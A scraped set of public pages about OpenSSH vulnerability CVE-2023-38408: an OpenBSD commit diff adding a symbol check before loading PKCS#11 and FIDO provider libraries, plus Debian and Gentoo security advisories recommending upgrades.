* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopenbsd%2Fsrc%2Fcommit%2Ff8f5a6b003981bb824329dc987d101977beda7ca)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=openbsd%2Fsrc)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[openbsd](/openbsd)
/
**[src](/openbsd/src)**
Public

* [Notifications](/login?return_to=%2Fopenbsd%2Fsrc) You must be signed in to change notification settings
* [Fork
  874](/login?return_to=%2Fopenbsd%2Fsrc)
* [Star
   3.3k](/login?return_to=%2Fopenbsd%2Fsrc)

* [Code](/openbsd/src)
* [Pull requests
  0](/openbsd/src/pulls)
* [Security](/openbsd/src/security)
* [Insights](/openbsd/src/pulse)

Additional navigation options

* [Code](/openbsd/src)
* [Pull requests](/openbsd/src/pulls)
* [Security](/openbsd/src/security)
* [Insights](/openbsd/src/pulse)

## Commit

[Permalink](/openbsd/src/commit/f8f5a6b003981bb824329dc987d101977beda7ca)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Ensure FIDO/PKCS11 libraries contain expected symbols

[Browse files](/openbsd/src/tree/f8f5a6b003981bb824329dc987d101977beda7ca)
Browse the repository at this point in the history

```
This checks via nlist(3) that candidate provider libraries contain one
of the symbols that we will require prior to dlopen(), which can cause
a number of side effects, including execution of constructors.

Feedback deraadt; ok markus
```

* Loading branch information

[![@djmdjm](https://avatars.githubusercontent.com/u/170281?s=40&v=4)](/djmdjm)

[djmdjm](/openbsd/src/commits?author=djmdjm "View all commits by djmdjm")
committed
Jul 19, 2023

1 parent
[7bc29a9](/openbsd/src/commit/7bc29a9d5cd697290aa056e94ecee6253d3425f8)

commit f8f5a6b

 Show file tree

 Hide file tree

Showing
**4 changed files**
with
**43 additions**
and
**6 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* usr.bin/ssh

  + usr.bin/ssh/misc.c
    [misc.c](#diff-1baa12ad01bad68b45e89594ef3309ad070f9848f764f976e08c435ade846ae5)
  + usr.bin/ssh/misc.h
    [misc.h](#diff-eaa10f11d4a4e42fc78accd1826f3f0421c1793d75137e8861a2b9a207ba3985)
  + usr.bin/ssh/ssh-pkcs11.c
    [ssh-pkcs11.c](#diff-12771f87455e5f3606a71af5d06169931cfa52151138f989f721acd6f2ad5152)
  + usr.bin/ssh/ssh-sk.c
    [ssh-sk.c](#diff-e5aa4ef15ef846c7f539cde5668fe7322d48336ecb3603b28bfac4edf9bd09d3)

## There are no files selected for viewing

31 changes: 30 additions & 1 deletion

31
[usr.bin/ssh/misc.c](#diff-1baa12ad01bad68b45e89594ef3309ad070f9848f764f976e08c435ade846ae5 "usr.bin/ssh/misc.c")

Show comments

[View file](/openbsd/src/blob/f8f5a6b003981bb824329dc987d101977beda7ca/usr.bin/ssh/misc.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,4 +1,4 @@ |
|  |  | /\* $OpenBSD: misc.c,v 1.183 2023/07/14 07:44:21 dtucker Exp $ \*/ |
|  |  | /\* $OpenBSD: misc.c,v 1.184 2023/07/19 14:02:27 djm Exp $ \*/ |
|  |  | /\* |
|  |  | \* Copyright (c) 2000 Markus Friedl. All rights reserved. |
|  |  | \* Copyright (c) 2005-2020 Damien Miller. All rights reserved. |
| Expand Down  Expand Up | | @@ -40,6 +40,7 @@ |
|  |  | #include <pwd.h> |
|  |  | #include <libgen.h> |
|  |  | #include <limits.h> |
|  |  | #include <nlist.h> |
|  |  | #include <poll.h> |
|  |  | #include <signal.h> |
|  |  | #include <stdarg.h> |
| Expand Down  Expand Up | | @@ -2814,3 +2815,31 @@ ptimeout\_isset(struct timespec \*pt) |
|  |  | { |
|  |  | return pt->tv\_sec != -1; |
|  |  | } |
|  |  |  |
|  |  | /\* |
|  |  | \* Returns zero if the library at 'path' contains symbol 's', nonzero |
|  |  | \* otherwise. |
|  |  | \*/ |
|  |  | int |
|  |  | lib\_contains\_symbol(const char \*path, const char \*s) |
|  |  | { |
|  |  | struct nlist nl[2]; |
|  |  | int ret = -1, r; |
|  |  |  |
|  |  | memset(nl, 0, sizeof(nl)); |
|  |  | nl[0].n\_name = xstrdup(s); |
|  |  | nl[1].n\_name = NULL; |
|  |  | if ((r = nlist(path, nl)) == -1) { |
|  |  | error\_f("nlist failed for %s", path); |
|  |  | goto out; |
|  |  | } |
|  |  | if (r != 0 || nl[0].n\_value == 0 || nl[0].n\_type == 0) { |
|  |  | error\_f("library %s does not contain symbol %s", path, s); |
|  |  | goto out; |
|  |  | } |
|  |  | /\* success \*/ |
|  |  | ret = 0; |
|  |  | out: |
|  |  | free(nl[0].n\_name); |
|  |  | return ret; |
|  |  | } |

3 changes: 2 additions & 1 deletion

3
[usr.bin/ssh/misc.h](#diff-eaa10f11d4a4e42fc78accd1826f3f0421c1793d75137e8861a2b9a207ba3985 "usr.bin/ssh/misc.h")

Show comments

[View file](/openbsd/src/blob/f8f5a6b003981bb824329dc987d101977beda7ca/usr.bin/ssh/misc.h)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,4 +1,4 @@ |
|  |  | /\* $OpenBSD: misc.h,v 1.102 2023/03/03 02:37:58 dtucker Exp $ \*/ |
|  |  | /\* $OpenBSD: misc.h,v 1.103 2023/07/19 14:02:27 djm Exp $ \*/ |
|  |  |  |
|  |  | /\* |
|  |  | \* Author: Tatu Ylonen <ylo@cs.hut.fi> |
| Expand Down  Expand Up | | @@ -96,6 +96,7 @@ int parse\_absolute\_time(const char \*, uint64\_t \*); |
|  |  | void format\_absolute\_time(uint64\_t, char \*, size\_t); |
|  |  | int path\_absolute(const char \*); |
|  |  | int stdfd\_devnull(int, int, int); |
|  |  | int lib\_contains\_symbol(const char \*, const char \*); |
|  |  |  |
|  |  | struct passwd \*pwcopy(struct passwd \*); |
|  |  | const char \*ssh\_gai\_strerror(int); |
| Expand Down | |  |

6 changes: 5 additions & 1 deletion

6
[usr.bin/ssh/ssh-pkcs11.c](#diff-12771f87455e5f3606a71af5d06169931cfa52151138f989f721acd6f2ad5152 "usr.bin/ssh/ssh-pkcs11.c")

Show comments

[View file](/openbsd/src/blob/f8f5a6b003981bb824329dc987d101977beda7ca/usr.bin/ssh/ssh-pkcs11.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,4 +1,4 @@ |
|  |  | /\* $OpenBSD: ssh-pkcs11.c,v 1.57 2023/07/19 13:55:53 djm Exp $ \*/ |
|  |  | /\* $OpenBSD: ssh-pkcs11.c,v 1.58 2023/07/19 14:02:27 djm Exp $ \*/ |
|  |  | /\* |
|  |  | \* Copyright (c) 2010 Markus Friedl. All rights reserved. |
|  |  | \* Copyright (c) 2014 Pedro Martelletto. All rights reserved. |
| Expand Down  Expand Up | | @@ -1507,6 +1507,10 @@ pkcs11\_register\_provider(char \*provider\_id, char \*pin, |
|  |  | debug\_f("provider already registered: %s", provider\_id); |
|  |  | goto fail; |
|  |  | } |
|  |  | if (lib\_contains\_symbol(provider\_id, "C\_GetFunctionList") != 0) { |
|  |  | error("provider %s is not a PKCS11 library", provider\_id); |
|  |  | goto fail; |
|  |  | } |
|  |  | /\* open shared pkcs11-library \*/ |
|  |  | if ((handle = dlopen(provider\_id, RTLD\_NOW)) == NULL) { |
|  |  | error("dlopen %s failed: %s", provider\_id, dlerror()); |
| Expand Down | |  |

9 changes: 6 additions & 3 deletions

9
[usr.bin/ssh/ssh-sk.c](#diff-e5aa4ef15ef846c7f539cde5668fe7322d48336ecb3603b28bfac4edf9bd09d3 "usr.bin/ssh/ssh-sk.c")

Show comments

[View file](/openbsd/src/blob/f8f5a6b003981bb824329dc987d101977beda7ca/usr.bin/ssh/ssh-sk.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,4 +1,4 @@ |
|  |  | /\* $OpenBSD: ssh-sk.c,v 1.39 2022/07/20 03:29:14 djm Exp $ \*/ |
|  |  | /\* $OpenBSD: ssh-sk.c,v 1.40 2023/07/19 14:02:27 djm Exp $ \*/ |
|  |  | /\* |
|  |  | \* Copyright (c) 2019 Google LLC |
|  |  | \* |
| Expand Down  Expand Up | | @@ -113,15 +113,18 @@ sshsk\_open(const char \*path) |
|  |  | ret->sk\_load\_resident\_keys = ssh\_sk\_load\_resident\_keys; |
|  |  | return ret; |
|  |  | } |
|  |  | if (lib\_contains\_symbol(path, "sk\_api\_version") != 0) { |
|  |  | error("provider %s is not an OpenSSH FIDO library", path); |
|  |  | goto fail; |
|  |  | } |
|  |  | if ((ret->dlhandle = dlopen(path, RTLD\_NOW)) == NULL) { |
|  |  | error("Provider \"%s\" dlopen failed: %s", path, dlerror()); |
|  |  | goto fail; |
|  |  | } |
|  |  | if ((ret->sk\_api\_version = dlsym(ret->dlhandle, |
|  |  | "sk\_api\_version")) == NULL) { |
|  |  | error("Provider \"%s\" dlsym(sk\_api\_version) failed: %s", |
|  |  | fatal("Provider \"%s\" dlsym(sk\_api\_version) failed: %s", |
|  |  | path, dlerror()); |
|  |  | goto fail; |
|  |  | } |
|  |  | version = ret->sk\_api\_version(); |
|  |  | debug\_f("provider %s implements version 0x%08lx", ret->path, |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `f8f5a6b`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopenbsd%2Fsrc%2Fcommit%2Ff8f5a6b003981bb824329dc987d101977beda7ca) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from lists.debian.org_88b78b82_20250110_133626.html ===


---

[[Date Prev](msg00020.html)][[Date Next](msg00022.html)]
[[Thread Prev](msg00020.html)][[Thread Next](msg00022.html)]
[[Date Index](maillist.html#00021)]
[[Thread Index](threads.html#00021)]

# [SECURITY] [DLA 3532-1] openssh security update

---

* *To*: debian-lts-announce@lists.debian.org
* *Subject*: [SECURITY] [DLA 3532-1] openssh security update
* *From*: Utkarsh Gupta <guptautkarsh2102@gmail.com>
* *Date*: Thu, 17 Aug 2023 06:47:24 +0530
* *Message-id*: <[[🔎]](/msgid-search/CAPP0f94M5qgfGXtb6uTqgNrDNXDFQ1miHjFFGs6MRwZVSY1Rzw%40mail.gmail.com) [CAPP0f94M5qgfGXtb6uTqgNrDNXDFQ1miHjFFGs6MRwZVSY1Rzw@mail.gmail.com](msg00021.html)>
* *Mail-followup-to*: debian-lts@lists.debian.org
* *Reply-to*: debian-lts@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

- -----------------------------------------------------------------------
Debian LTS Advisory DLA-3532-1              debian-lts@lists.debian.org
<https://www.debian.org/lts/security/>                      Utkarsh Gupta
August 17, 2023                             <https://wiki.debian.org/LTS>
- -----------------------------------------------------------------------

Package        : openssh
Version        : 1:7.9p1-10+deb10u3
CVE ID         : CVE-2023-38408
Debian Bug     : 1042460

It was discovered that OpenSSH incorrectly handled loading certain
PKCS#11 providers. If a user forwarded their ssh-agent to an untrusted
system, a remote attacker could possibly use this issue to load
arbitrary libraries from the user’s system and execute arbitrary code.

In addition to the above security issue, this update also fixed
another bug - bad interaction between the ssh_config ConnectTimeout
and ConnectionAttempts directives - connection attempts after the
first attempt were ignoring the requested timeout. More details about
this can be found at <https://bugzilla.mindrot.org/show_bug.cgi?id=2918>.

For Debian 10 buster, this problem has been fixed in version
1:7.9p1-10+deb10u3.

We recommend that you upgrade your openssh packages.

For the detailed security status of openssh please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/openssh>

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://wiki.debian.org/LTS>
-----BEGIN PGP SIGNATURE-----

iQIzBAEBCAAdFiEEbJ0QSEqa5Mw4X3xxgj6WdgbDS5YFAmTddPsACgkQgj6WdgbD
S5aQzA//cTI4qu9QQLW4AqLRp2eGmR0DFdUAO72N5KUujjrg/sZTN0wg8983TLCP
xM6pU0x5m3Lfn/jvrdpgugIK+tuePsdhPV6fjX0p/pnrh6sxbT8R6j+o3uCWhK8a
y1viURtHY4X+eiIzn2ph24QaGDnPZIe54XWXwj272bmVlf9KdAMyoF23uu5Un14Z
2vH7YPJuEMVbKclRK1pNIVv0Oq/4CqvzgdWcshnmLkE4V4krxDhvFiu1htDoxDEb
goSjmjN9VZ7d8c++S6COcvJiGWEVlYCviLww8Ae79Jfc4LAxfIaEfixiJfX+q9c0
JJBbk5X5/8dWI7WuiTT3pMGKw6QxCvLCNI7QuCgi9MR2u5Sn7ekbvBfUguOOFbfq
RQba1gJIA4KzP2T2W3p7qtg2SHcmBHZZlSoMx83RoylHU8SgO2LL82rvyyZvW/eC
alnZIvXRgn1kBnrmh7bA3IDyDH4fD3M+dFKI3935AdtnnWJLLCQLE0+jr/LBQsUe
hxVgMmA05uGsqZK+/zGX9blvIiamyhsEnzLNA8cQbj2Oe6QFYzYRV/RFjiyiYLxo
YqFEE6p/SA3+4GqrEqYzKWOIstXubqv6LL6bX0WVdpjyQlbjkU+BTb1FuuRk3y5r
DwKU7s45i1oVJCC3nJooVQLp3CkeZ+RXcZ/XCNddPcqn9qb7prs=
=Qlgk
-----END PGP SIGNATURE-----

```

---



=== Content from security.gentoo.org_57196392_20250110_133629.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# OpenSSH: Remote Code Execution — GLSA **202307-01**

Multiple vulnerbilities have been discovered in OpenSSH, the worst of which could result in remote code execution.

### Affected packages

| Package | **net-misc/openssh** on all architectures |
| --- | --- |
| Affected versions | < **9.3\_p2** |
| Unaffected versions | >= **9.3\_p2** |

### Background

OpenSSH is a free application suite consisting of server and clients that replace tools like telnet, rlogin, rcp and ftp with more secure versions offering additional functionality.

### Description

Multiple vulnerabilities have been discovered in OpenSSH. Please review the CVE identifiers referenced below for details.

### Impact

Please review the CVE identifiers referenced below for details.

### Workaround

CVE-2023-38408 can be worked around by avoiding connecting to untrusted servers with an SSH agent.

### Resolution

All OpenSSH users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=net-misc/openssh-9.3_p2"

```
### References

* [CVE-2023-25136](https://nvd.nist.gov/vuln/detail/CVE-2023-25136)
* [CVE-2023-28531](https://nvd.nist.gov/vuln/detail/CVE-2023-28531)
* [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

**Release date**

July 20, 2023

**Latest revision**

July 20, 2023: 1

**Severity**

high

**Exploitable**

remote

**Bugzilla entries**

* [892936](https://bugs.gentoo.org/show_bug.cgi?id=892936)
* [905299](https://bugs.gentoo.org/show_bug.cgi?id=905299)
* [910553](https://bugs.gentoo.org/show_bug.cgi?id=910553)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**



=== Content from packetstormsecurity.com_bf1537f0_20250110_133616.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)


